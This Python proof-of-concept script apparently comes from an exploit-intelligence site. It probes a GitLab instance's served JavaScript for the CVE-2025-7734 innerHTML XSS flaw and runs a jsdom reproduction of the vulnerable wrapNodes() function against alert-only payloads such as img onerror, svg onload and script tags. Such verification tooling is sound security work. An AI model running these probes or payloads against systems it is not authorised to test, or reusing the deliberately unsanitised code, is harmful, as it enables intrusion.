#!/usr/bin/env python3
"""
Exploit Intelligence Platform (EIP) â€” https://exploit-intel.com
@exploit_intel

CVE-2025-7734 â€” Vector 2: Blob Viewer innerHTML Assignment

Demonstrates the SECONDARY attack surface in GitLab's blob viewer.
The loadViewer() function in blob/viewer/index.js directly assigns
server-returned HTML to viewer.innerHTML without sanitization:

    viewer.innerHTML = data.html;  // â† Unsanitized server response

This vector requires either:
  a) A stored XSS in the Rails backend that gets rendered in the blob viewer HTML
  b) A man-in-the-middle attack to inject malicious HTML into the AJAX response
  c) A server-side template injection that controls data.html

This PoC verifies the vulnerable code path exists and demonstrates the risk
by checking the JavaScript source served by the GitLab instance.

Additionally, this script extracts and runs a Node.js simulation of the
vulnerable wrapNodes() function to demonstrate the primary XSS vector
at the JavaScript engine level (without needing a full browser).

Usage:
    python3 poc_vector2.py <gitlab_host> [--port PORT] [--token TOKEN]
"""

import argparse
import json
import os
import subprocess
import sys
import urllib.request
import urllib.error


def check_vulnerable_js(base_url, host_header, token):
    """
    Fetch the GitLab webpack bundles and verify the vulnerable code patterns exist.
    This proves the target instance contains the unpatched JavaScript.
    """
    print("[*] Vector 2: Checking for vulnerable JavaScript in served assets...")

    # Fetch the main page to find webpack asset URLs
    req = urllib.request.Request(
        f"{base_url}/",
        headers={"Host": host_header, "PRIVATE-TOKEN": token}
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            html = resp.read().decode("utf-8", errors="replace")
    except Exception as e:
        print(f"  [!] Failed to fetch main page: {e}")
        return False

    # Look for webpack chunk URLs
    import re
    js_urls = re.findall(r'(/assets/webpack/[a-zA-Z0-9._-]+\.js)', html)
    print(f"  [*] Found {len(js_urls)} webpack asset URLs")

    # Check each bundle for the vulnerable patterns
    vulnerable_patterns = {
        "wrapNodes_innerHTML": r'wrapper\.innerHTML\s*=\s*wrapSpacesWithSpans',
        "viewer_innerHTML": r'viewer\.innerHTML\s*=\s*data\.html',
        "deprecatedNodeUpdate": r'deprecatedNodeUpdate',
        "wrapNodes_function": r'wrapNodes\s*=.*createSpan',
        "no_sanitized_property": r'no-unsanitized/property',
    }

    # Also check the blob viewer JS specifically
    # The vulnerable code might be in a chunk loaded only on blob pages
    blob_url = f"{base_url}/root/xss-poc/-/blob/main/payload.py"
    req = urllib.request.Request(
        blob_url,
        headers={"Host": host_header, "PRIVATE-TOKEN": token}
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            blob_html = resp.read().decode("utf-8", errors="replace")
        blob_js_urls = re.findall(r'(/assets/webpack/[a-zA-Z0-9._-]+\.js)', blob_html)
        js_urls.extend(blob_js_urls)
        js_urls = list(set(js_urls))  # deduplicate
        print(f"  [*] Total unique JS bundles: {len(js_urls)}")
    except Exception:
        pass

    found_patterns = {}
    checked = 0
    for js_url in js_urls[:30]:  # Check first 30 bundles
        req = urllib.request.Request(
            f"{base_url}{js_url}",
            headers={"Host": host_header}
        )
        try:
            with urllib.request.urlopen(req, timeout=15) as resp:
                js_content = resp.read().decode("utf-8", errors="replace")
            checked += 1

            for name, pattern in list(vulnerable_patterns.items()):
                if name not in found_patterns and re.search(pattern, js_content):
                    found_patterns[name] = js_url
                    print(f"  [+] FOUND '{name}' in {js_url}")
        except Exception:
            continue

    print(f"\n  [*] Checked {checked} JS bundles")
    print(f"  [*] Found {len(found_patterns)}/{len(vulnerable_patterns)} vulnerable patterns")

    if found_patterns:
        print("\n  [+] VULNERABLE PATTERNS CONFIRMED in served JavaScript:")
        for name, url in found_patterns.items():
            print(f"      {name}: {url}")
        return True
    else:
        print("\n  [*] Could not locate vulnerable patterns in served bundles")
        print("      (Patterns may be in dynamically loaded chunks)")
        return False


def run_nodejs_verification():
    """
    Run a Node.js script that simulates the vulnerable code path.
    This demonstrates the XSS at the JavaScript engine level without needing a browser.
    """
    print("\n[*] Running Node.js verification of vulnerable wrapNodes() function...")

    # Write a Node.js script that uses jsdom to simulate the vulnerable code
    node_script = r"""
const { JSDOM } = require('jsdom');

// Create a simulated browser environment
const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>', {
  runScripts: "dangerously",
  pretendToBeVisual: true
});
const { document, window } = dom.window;

// â”€â”€â”€ EXACT CODE FROM GITLAB (pre-fix) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

function createSpan() {
  return document.createElement('span');
}

function wrapSpacesWithSpans(text) {
  return text
    .replace(/\t/g, '<span class="code-nav-tab">\t</span>')
    .replace(/ {2}/g, '<span class="code-nav-space">  </span>');
}

// VULNERABLE wrapNodes â€” assigns textContent to innerHTML
function wrapNodes(text, classList, dataset) {
  const wrapper = createSpan();
  wrapper.innerHTML = wrapSpacesWithSpans(text);  // â† THE BUG
  return wrapper;
}

// â”€â”€â”€ TEST CASES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

const testCases = [
  {
    name: "XSS via <img> onerror",
    input: '<img/src/onerror=alert(document.domain)>',
    expectXSS: true
  },
  {
    name: "XSS via <svg> onload",
    input: '<svg/onload=alert(1)>',
    expectXSS: true
  },
  {
    name: "XSS via <script> tag",
    input: '<script>alert("XSS")</script>',
    expectXSS: true
  },
  {
    name: "Safe text (no HTML)",
    input: 'hello world',
    expectXSS: false
  },
  {
    name: "HTML entities (already escaped)",
    input: '&lt;img onerror=alert()&gt;',
    expectXSS: false
  }
];

console.log('â•â•â• CVE-2025-7734 Node.js Verification â•â•â•');
console.log('Testing wrapNodes() with various inputs:\n');

let xssCount = 0;

testCases.forEach((tc, i) => {
  console.log(`Test ${i + 1}: ${tc.name}`);
  console.log(`  Input text:  "${tc.input}"`);

  // Simulate what happens: textContent contains the decoded text
  const span = document.createElement('span');
  span.textContent = tc.input;  // Browser stores as text, not HTML
  const textContent = span.textContent;

  console.log(`  textContent: "${textContent}"`);

  // Now run the vulnerable function
  const result = wrapNodes(textContent);
  console.log(`  innerHTML:   "${result.innerHTML}"`);

  // Check for dangerous elements
  const dangerousEls = result.querySelectorAll('img, svg, script, iframe, object, embed');
  const hasEventHandlers = result.innerHTML.match(/on\w+\s*=/i);

  if (dangerousEls.length > 0) {
    xssCount++;
    const tags = Array.from(dangerousEls).map(e => e.tagName.toLowerCase());
    console.log(`  RESULT: ğŸš¨ XSS! Created ${dangerousEls.length} element(s): <${tags.join('>, <')}>`);
    if (hasEventHandlers) {
      console.log(`  EVENT HANDLERS: ${result.innerHTML.match(/on\w+\s*=/gi).join(', ')}`);
    }
  } else {
    console.log(`  RESULT: âœ… Safe (no dangerous elements created)`);
  }
  console.log('');
});

console.log('â•â•â• SUMMARY â•â•â•');
console.log(`XSS triggered: ${xssCount}/${testCases.length} test cases`);
console.log(`Vulnerability: ${xssCount > 0 ? 'CONFIRMED' : 'NOT CONFIRMED'}`);
console.log('');
console.log('Root cause: wrapNodes() assigns textContent to innerHTML');
console.log('textContent returns decoded text â†’ innerHTML parses it as HTML');
console.log('Fix: DOMPurify.sanitize() before innerHTML assignment (commit 8370acfa)');

process.exit(xssCount > 0 ? 0 : 1);
""".strip()

    # Write the script (use .cjs to force CommonJS mode since root package.json has "type": "module")
    poc_dir = os.path.dirname(os.path.abspath(__file__))
    script_path = os.path.join(poc_dir, "verify_wrapnodes.cjs")
    with open(script_path, "w") as f:
        f.write(node_script)

    # Install jsdom
    print("  [*] Installing jsdom...")
    result = subprocess.run(
        ["npm", "install", "jsdom"],
        cwd=poc_dir,
        capture_output=True, text=True, timeout=60
    )
    if result.returncode != 0:
        print(f"  [!] Failed to install jsdom: {result.stderr[:200]}")
        return False

    # Run the verification
    print("  [*] Running verification script...")
    result = subprocess.run(
        ["node", script_path],
        capture_output=True, text=True, timeout=30,
        cwd=poc_dir
    )

    print(result.stdout)
    if result.stderr:
        print(f"  [stderr] {result.stderr[:200]}")

    return result.returncode == 0


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-7734 Vector 2: Blob Viewer innerHTML + Node.js Verification"
    )
    parser.add_argument("target", nargs="?", default="localhost",
                        help="GitLab server IP/hostname (default: localhost)")
    parser.add_argument("--port", type=int, default=8880,
                        help="GitLab HTTP port (default: 8880)")
    parser.add_argument("--token", required=True,
                        help="GitLab Personal Access Token")
    parser.add_argument("--host-header", default="gitlab.local")

    args = parser.parse_args()
    base_url = f"http://{args.target}:{args.port}" if args.port != 80 else f"http://{args.target}"

    print("=" * 70)
    print("CVE-2025-7734 â€” Vector 2: Blob Viewer innerHTML + JS Verification")
    print("=" * 70)

    # Test 1: Check for vulnerable JS patterns in served assets
    js_vuln = check_vulnerable_js(base_url, args.host_header, args.token)

    # Test 2: Node.js engine-level verification of wrapNodes
    node_vuln = run_nodejs_verification()

    print("\n" + "=" * 70)
    print("RESULTS:")
    print(f"  Vulnerable JS in served assets:  {'CONFIRMED' if js_vuln else 'INCONCLUSIVE'}")
    print(f"  Node.js wrapNodes verification:  {'CONFIRMED' if node_vuln else 'FAILED'}")
    print("=" * 70)

    return js_vuln or node_vuln


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
